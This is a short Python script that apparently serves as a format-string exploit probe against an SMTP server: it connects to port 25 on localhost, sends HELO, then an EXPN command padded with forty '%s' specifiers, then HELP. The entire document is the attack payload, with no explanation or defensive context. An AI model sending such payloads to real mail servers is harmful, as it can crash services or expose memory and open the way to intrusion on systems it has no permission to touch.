import socket  

   

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  

   

buffer = "EXPN " + "%s" * 40 + "\r\n" 

   

s.connect(('127.0.0.1',25))  

   

data=s.recv(1024)  

s.send("HELO\r\n")  

   

s.send(buffer)  

   

s.send("HELP\r\n")  

s.close() 

